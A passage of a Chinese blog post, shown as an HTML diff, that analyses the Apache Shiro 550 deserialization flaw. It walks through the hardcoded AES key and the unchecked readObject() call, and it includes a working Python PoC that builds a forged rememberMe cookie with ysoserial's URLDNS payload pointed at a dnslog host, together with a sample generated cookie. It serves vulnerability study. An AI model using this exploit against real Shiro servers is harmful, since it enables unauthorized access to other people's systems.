class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.write(rememberMe_64)</span><br></pre></td></tr></table></figure>
 
-<p>内容如下:<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205104.png" srcset="/img/loading.gif" lazyload alt="image-20210519214639370"></p>
+<p>内容如下:<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205104.png" alt="image-20210519214639370"></p>
 <p>上述内容中并没有在<a href="">初探Java反序列化漏洞（一）</a>中提到过的序列化的数据流以魔术数字和版本号<code>AC ED 00 05</code> 等字样。这是因为上述关键步骤中提到了<code>AES解密</code>，所以需要去跟一下源码。</p>
-<h3 id="3-2-Shiro-500-中的-AES-解密"><a href="#3-2-Shiro-500-中的-AES-解密" class="headerlink" title="3.2 Shiro 500 中的 AES 解密"></a>3.2 Shiro 500 中的 AES 解密</h3><p>在IDEA中<code>ctrl+shift+f</code> 全局搜索<code>AES</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205115.png" srcset="/img/loading.gif" lazyload alt="image-20210520201956272"></p>
+<h3 id="3-2-Shiro-500-中的-AES-解密"><a href="#3-2-Shiro-500-中的-AES-解密" class="headerlink" title="3.2 Shiro 500 中的 AES 解密"></a>3.2 Shiro 500 中的 AES 解密</h3><p>在IDEA中<code>ctrl+shift+f</code> 全局搜索<code>AES</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205115.png" alt="image-20210520201956272"></p>
 <p>在<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中找到了</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p><strong>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)</strong> 就是我们要找的硬编码密钥，因为AES是对称加密，即加密密钥也同样是解密密钥。</p>
 <p>然后看看shiro是怎么处理解密的，向下看，找到</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Decrypts the byte array using the configured &#123;<span class="hljs-doctag">@link</span> #getCipherService() cipherService&#125;.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> encrypted the encrypted byte array to decrypt</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="hljs-doctag">@link</span> #getCipherService () cipher&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] decrypt(<span class="hljs-keyword">byte</span>[] encrypted) &#123;<br>    <span class="hljs-keyword">byte</span>[] serialized = encrypted;<br>    CipherService cipherService = getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) &#123;<br>        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decrypts the byte array using the configured &#123;<span class="doctag">@link</span> #getCipherService() cipherService&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encrypted the encrypted byte array to decrypt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="doctag">@link</span> #getCipherService () cipher&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>函数名<code>decrypt</code>，显而易见，是处理解密的，<code>cipherService</code>是一个接口,调用了其中的<code>decrypt</code>解密方法，需要两个变量<code>encrypted</code>(被加密的数组) 和 <code>getDecryptionCipherKey()</code>(获取解密秘钥)，前面说了AES是对称加密，即加密密钥也同样是解密密钥。而且从程序中也能看到，确实是同一个，通过在该类中查找<code>setDecryptionCipherKey()</code>方法，可以看到<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205124.png" srcset="/img/loading.gif" lazyload alt="image-20210520204036228"></p>
-<p>再搜索<code>setCipherKey</code>，可以看到构造方法中传入了<code>DEFAULT_CIPHER_KEY_BYTES</code>也就是<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>的值<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205131.png" srcset="/img/loading.gif" lazyload alt="image-20210520204113812"></p>
-<p>然后再看一下<code>CipherService</code>这个接口的<code>decrypt</code>的具体实现，<code>ctrl+右键</code>跟进去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205138.png" srcset="/img/loading.gif" lazyload alt="image-20210520205000830"></p>
+<p>函数名<code>decrypt</code>，显而易见，是处理解密的，<code>cipherService</code>是一个接口,调用了其中的<code>decrypt</code>解密方法，需要两个变量<code>encrypted</code>(被加密的数组) 和 <code>getDecryptionCipherKey()</code>(获取解密秘钥)，前面说了AES是对称加密，即加密密钥也同样是解密密钥。而且从程序中也能看到，确实是同一个，通过在该类中查找<code>setDecryptionCipherKey()</code>方法，可以看到<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205124.png" alt="image-20210520204036228"></p>
+<p>再搜索<code>setCipherKey</code>，可以看到构造方法中传入了<code>DEFAULT_CIPHER_KEY_BYTES</code>也就是<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>的值<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205131.png" alt="image-20210520204113812"></p>
+<p>然后再看一下<code>CipherService</code>这个接口的<code>decrypt</code>的具体实现，<code>ctrl+右键</code>跟进去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205138.png" alt="image-20210520205000830"></p>
 <p>这只是个接口，全局搜索<code>implements CipherService</code> 发现<code>src/main/java/org/apache/shiro/crypto/JcaCipherService.java</code>实现了<code>CipherService</code>接口，进去看看<code>decrypt</code>方法</p>
-<p>为了方便，我们在这里下个断点，发现是<code>CBC</code>模式，并且 <code>iv</code>偏移量的值为 **byte[] iv = new byte[16] ** <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520215312.png" srcset="/img/loading.gif" lazyload alt="image-20210520215309770"></p>
+<p>为了方便，我们在这里下个断点，发现是<code>CBC</code>模式，并且 <code>iv</code>偏移量的值为 **byte[] iv = new byte[16] ** <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520215312.png" alt="image-20210520215309770"></p>
 <p>利用下面的脚本解密之前<code>base64解码</code>后生成的<code>rememberMe</code>文件得到<code>decrypt.bin</code>文件</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># pip install pycrypto</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_rememberme_file</span>(<span class="hljs-params">filename</span>):</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fpr:<br>        key  =  <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>        mode =  AES.MODE_CBC<br>        IV   = <span class="hljs-string">b&#x27; &#x27;</span> * <span class="hljs-number">16</span><br>        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)<br>        remember_bin = encryptor.decrypt(fpr.read())<br>    <span class="hljs-keyword">return</span> remember_bin<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;decrypt.bin&quot;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> fpw:<br>        fpw.write(decode_rememberme_file(sys.argv[<span class="hljs-number">1</span>]))<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rememberme_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fpr:</span><br><span class="line">        key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">        mode =  AES.MODE_CBC</span><br><span class="line">        IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">        remember_bin = encryptor.decrypt(fpr.read())</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt.bin&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520221430.png" srcset="/img/loading.gif" lazyload alt="image-20210520221418998"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520221430.png" alt="image-20210520221418998"></p>
 <p>这是 Java 序列化的标志，说明解密成功</p>
-<h3 id="3-3-反序列化"><a href="#3-3-反序列化" class="headerlink" title="3.3 反序列化"></a>3.3 反序列化</h3><p>看看解密之后的操作，回到<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>类中，看看，从哪里调用了<code>decrypt</code>函数，<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074327.png" srcset="/img/loading.gif" lazyload alt="image-20210521073527745"></p>
-<p>在<code>convertBytesToPrincipals</code>这里解密之后，执行了反序列化<code>deserialize</code>，进去瞅瞅<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074332.png" srcset="/img/loading.gif" lazyload alt="image-20210521074103621"></p>
-<p>通过获取<code>getSerializer()</code>来调用反序列化，再看看<code>SetSerializer</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074338.png" srcset="/img/loading.gif" lazyload alt="image-20210521074230279"></p>
-<p><strong>src/main/java/org/apache/shiro/io/DefaultSerializer.java</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074341.png" srcset="/img/loading.gif" lazyload alt="image-20210521074304324"></p>
-<p>这里使用的是默认反序列化类，没有任何检验，<code>readobject()</code>触发反序列化!<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092011.png" srcset="/img/loading.gif" lazyload alt="image-20210521074629505"></p>
+<h3 id="3-3-反序列化"><a href="#3-3-反序列化" class="headerlink" title="3.3 反序列化"></a>3.3 反序列化</h3><p>看看解密之后的操作，回到<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>类中，看看，从哪里调用了<code>decrypt</code>函数，<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074327.png" alt="image-20210521073527745"></p>
+<p>在<code>convertBytesToPrincipals</code>这里解密之后，执行了反序列化<code>deserialize</code>，进去瞅瞅<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074332.png" alt="image-20210521074103621"></p>
+<p>通过获取<code>getSerializer()</code>来调用反序列化，再看看<code>SetSerializer</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074338.png" alt="image-20210521074230279"></p>
+<p><strong>src/main/java/org/apache/shiro/io/DefaultSerializer.java</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074341.png" alt="image-20210521074304324"></p>
+<p>这里使用的是默认反序列化类，没有任何检验，<code>readobject()</code>触发反序列化!<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092011.png" alt="image-20210521074629505"></p>
 <h2 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h2><p>现在我们知道了<strong>shiro550</strong>在获取到<strong>rememberMe cookie</strong>的值后，通过硬编码的KEY **kPH+bIxk5D2deZiIxcaaaA==<strong>进行AES解密，解密完成之后直接调用默认的反序列化的</strong>readobject()**方法，没有经过任何的校验。</p>
-<p>具体的 <strong>Payload</strong> 也就呼之欲出了，将<code>payload</code>通过AES加密伪造<strong>rememberMe cookie</strong>,我们通过刚才的解密流程知道<strong>shiro550</strong>采用的<strong>CBC</strong>模式、**byte[] iv = new byte[16]**， 通过脚本伪造，利用<code>ysoserial.jar</code> 神器生成<code>URLDNS</code>探测的payload进行探测(shiro550自带来commons-collections3.2.1，关于commons-collections的相关漏洞，后续分析)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092006.png" srcset="/img/loading.gif" lazyload alt="image-20210521091543563"></p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># －*-* coding:utf-8</span><br><span class="hljs-comment"># @Time    :  2020/10/16 17:36</span><br><span class="hljs-comment"># @Author  : nice0e3</span><br><span class="hljs-comment"># @FileName: poc.py</span><br><span class="hljs-comment"># @Software: PyCharm</span><br><span class="hljs-comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command],<br>                             stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = <span class="hljs-string">b&#x27; &#x27;</span> * <span class="hljs-number">16</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 替换dnslog </span><br>    payload = rememberme(<span class="hljs-string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.cookie&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fpw:<br><br>        print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br>        res = <span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br>        fpw.write(res)<br></code></pre></div></td></tr></table></figure>
+<p>具体的 <strong>Payload</strong> 也就呼之欲出了，将<code>payload</code>通过AES加密伪造<strong>rememberMe cookie</strong>,我们通过刚才的解密流程知道<strong>shiro550</strong>采用的<strong>CBC</strong>模式、**byte[] iv = new byte[16]**， 通过脚本伪造，利用<code>ysoserial.jar</code> 神器生成<code>URLDNS</code>探测的payload进行探测(shiro550自带来commons-collections3.2.1，关于commons-collections的相关漏洞，后续分析)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092006.png" alt="image-20210521091543563"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog </span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>
 
 <p>运行生成</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==</span><br></pre></td></tr></table></figure>
 
-<p>替换打成功<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521091957.png" srcset="/img/loading.gif" lazyload alt="image-20210521084722601"></p>
-<p>其实一开始是失败的，shiro550自带的包是commons-collections3.2.1,原生情况下直接用ysoserial打，是不会成功的，其他位置中直接添加了<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092002.png" srcset="/img/loading.gif" lazyload alt="image-20210521091756305"></p>
+<p>替换打成功<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521091957.png" alt="image-20210521084722601"></p>
+<p>其实一开始是失败的，shiro550自带的包是commons-collections3.2.1,原生情况下直接用ysoserial打，是不会成功的，其他位置中直接添加了<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092002.png" alt="image-20210521091756305"></p>
 <p>commons-collections4的包，才可以顺畅复现。至于为啥原生的3.2.1不能触发漏洞，以及可不可以触发漏洞，下篇文章再分析。</p>
 <h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Apache Shiro Java 反序列化漏洞分析 <a target="_blank" rel="noopener" href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p>
 <p>Java安全之Shiro 550反序列化漏洞分析 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p>
 <p>ysoserial <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">yhy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/">https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://fireline.fun" target="_blank">yhy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></div><div class="post_share"><div class="social-share" data-image="/img/default.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/"><img class="prev-cover" src="/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java反序列化漏洞分析(二)-Shiro550</div></div></a></div><div class="next-post pull-right"><a 